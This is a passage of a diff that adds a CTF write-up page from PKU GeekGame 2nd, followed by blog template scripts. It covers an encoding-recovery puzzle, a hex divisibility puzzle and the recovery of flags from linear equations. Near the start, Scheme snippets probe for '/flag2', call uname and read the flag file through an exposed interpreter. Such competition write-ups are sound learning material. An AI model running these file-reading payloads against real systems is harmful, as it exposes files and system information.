+target="_blank" rel="noopener" href="https://deathking.github.io/yast-cn/">入门教程</a>设计了文件读取的代码，效果如下：</p>
+<figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs scheme"># <span class="hljs-number">1</span>. 确认flag<span class="hljs-number">2</span>的位置<br>(<span class="hljs-name"><span class="hljs-built_in">if</span></span> (<span class="hljs-name">file-exists?</span> <span class="hljs-string">&quot;/flag2&quot;</span>) <span class="hljs-string">&quot;true&quot;</span> <span class="hljs-string">&quot;false&quot;</span>) <br><br># <span class="hljs-number">2</span>. 尝试获取系统信息<br>(<span class="hljs-name">object-&gt;string</span> (<span class="hljs-name">uname</span>))<br><br># <span class="hljs-number">3</span>. 文件读取<br>(<span class="hljs-name">object-&gt;string</span> (<span class="hljs-name"><span class="hljs-built_in">read</span></span> (<span class="hljs-name"><span class="hljs-built_in">open-input-file</span></span> <span class="hljs-string">&quot;/flag2&quot;</span>)))<br></code></pre></td></tr></table></figure>
+<p><img src="/img/geek2/3.png" srcset="/img/loading.gif" lazyload /></p>
+<h2 id="section">381654729</h2>
+<p>要求找到16进制下任意前n位都能整除n的数。由于满足条件的n位数，前n-1位一定也满足条件，记忆化搜索即可。符合条件的数最大只有39位，依次检查3个满足条件的数找到flag。</p>
+<p>代码：<a
+target="_blank" rel="noopener" href="https://github.com/allons42/CTF-Writeup/blob/main/PKUgeekgame-2nd/codes/381654729.ipynb">381654729.ipynb</a>。</p>
+<h2 id="乱码还原">乱码还原</h2>
+<p>首先审计源码，两个flag都是先用Encrypt函数加密为佛语，然后依次用UTF-8和shift_jis编码，后者编码过程中会损失部分信息，相当于以字节为单位的部分缺失。</p>
+<p>flag1长度很短，可以通过递归搜索的方式插入可能的字节，暴力枚举原始字符串。</p>
+<p>对于flag2，需要分析shift_jis编码前后的数据特点。佛语的UTF-8编码全都是3个字节，第一个字节都在0xe3-0xe9之间，且后两个字节没有超过0xe0的数据，因此大于0xe0的字节相当于佛语的单字分隔符。在shift_jis编码中一个字符占两个字节，根据编码规范，大于0xe0的字节作为第一个字节或第二个字节都可以，也不存在无法编码的情况。总之，这种字节可以作为严格的佛语划分标准。</p>
+<p>按大于0xe0的字节划分后，发现共有27466个佛语字符，其中4712个丢了一个字节，83个丢了两个字节。对每个佛语字符枚举可能丢失的字节内容，得到一个很大的候选集合，接下来就要考虑怎样缩小搜索范围，找出真正合法的序列。</p>
+<p>用”合法序列“代指shift_jis编码后与密文相同的序列，则合法序列的前缀必然也能编码出密文的前缀。由于不同的合法序列差异只在于无法编码被丢掉的字节，两个合法序列以佛语字符为单位任意重组也是合法的，因此完全可以用任意一个的前缀作为基准，判定后续的佛语编码后是否与密文相同。算法实现上，对每个有多种可能的佛语字符进行遍历，将其拼接到现有合法序列的后面以检查其合法性，一次遍历后得到剩余的佛语方案和一个模板串，包括55个有2种候选方案的佛语字符和2个有3种候选方案的佛语字符。</p>
+<p>到这一步，超过2^55种组合方案全都可以正确编码为密文，但数量还是太多。下一步是保证佛语能够正确解码。Decrypt函数对佛语依次做了AES-256-CBC解码和utf-16le解码的处理，尝试用Decrypt处理模板串，发现在utf-16le解码这一步报错。由于AES是从前到后的分组加密，后面的加密不会影响前面的加密结果，因此可以从前往后逐个尝试佛语字符的替换方案，根据utf-16le报错的位点确定佛语是否正确，直到编码正确为止。</p>
+<p>至此，已经解出了唯一的佛语序列，还需要用b16decode, b32decode,
+b64decode, b85decode,
+a85decode组成的随机序列解码10次。好在这些编码方式的字符集特点相当明确，每次解码都可以确定唯一的解码方式，10次之后得到utf-8编码的序列，再次解码得到flag。</p>
+<p>代码：<a
+target="_blank" rel="noopener" href="https://github.com/allons42/CTF-Writeup/blob/main/PKUgeekgame-2nd/codes/codes.ipynb">codes.ipynb</a>。</p>
+<h2 id="方程组">方程组</h2>
+<p>审计源码，是用n个质数平方根循环位移得到n×n的系数矩阵A，用flag的ascii码作为向量x，乘积b=Ax，已知A和b求解x。</p>
+<h4 id="flag1-1">flag1</h4>
+<p>已知x长度是26，已知A和b，直接用python的<code>scipy.optimize.nnls</code>或<code>numpy.linalg.solve</code>直接求解方程组，结果四舍五入取整即可。</p>
+<h4 id="flag2-1">flag2</h4>
+<p>已知x长度是28，已知A，但只知道b的前18位。可以猜出x前5位是<code>flag&#123;</code>，把x的后5位用均值替换，求解这个18元线性方程组，得到中间18位是<code>y1v^are_b_fpufLg|</code>，根据词义和语法猜出前几位应该是<code>y0u_are_a_</code>。再次将前10位<code>flag&#123;y0u_ar</code>作为常数代入，精确解出后几位，最后得到<code>flag&#123;y0u_are_a_good_guesser&#125;</code>。</p>
+<h4 id="flag3">flag3</h4>
+<p>这次只给了一个方程，但是提供了200位有效数字的精度，变成了大系数的多元一次整数不定方程问题。没想到做法。</p>
+<p>代码：<a
+target="_blank" rel="noopener" href="https://github.com/allons42/CTF-Writeup/blob/main/PKUgeekgame-2nd/codes/equation.ipynb">equation.ipynb</a>。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Tech/" class="category-chain-item">Tech</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Tech/" class="print-no-link">#Tech</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>PKU GeekGame 2nd Writeup</div>
+      <div>https://allons42.github.io/geekgame_2nd/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>allons42</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年11月26日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/geekgame_3rd/" title="PKU GeekGame 3rd Writeup">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">PKU GeekGame 3rd Writeup</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/geekgame_1st/" title="PKU GeekGame 1st Writeup">
+                        <span class="hidden-mobile">PKU GeekGame 1st Writeup</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="twikoo"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/twikoo/1.6.8/twikoo.all.min.js', function() {
+        var options = Object.assign(
+          {"envId":"https://allons42.netlify.app/.netlify/functions/twikoo","region":"ap-shanghai","path":"window.location.pathname"},
+          {
+            el: '#twikoo',
+            path: 'window.location.pathname',
+            onCommentLoaded: function() {
+              Fluid.utils.listenDOMLoaded(function() {
+                var imgSelector = '#twikoo .tk-content img:not(.tk-owo-emotion)';
+                Fluid.plugins.imageCaption(imgSelector);
+                Fluid.plugins.fancyBox(imgSelector);
+              });
+            }
+          }
+        )
+        twikoo.init(options)
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+
+        Fluid.events.registerRefreshCallback(function() {
+          if ('MathJax' in window && MathJax.startup.document && typeof MathJax.startup.document.state === 'function') {
+            MathJax.startup.document.state(0);
+            MathJax.texReset();
+            MathJax.typeset();
+            MathJax.typesetPromise();
+          }
+        });
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.2/es5/tex-mml-chtml.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
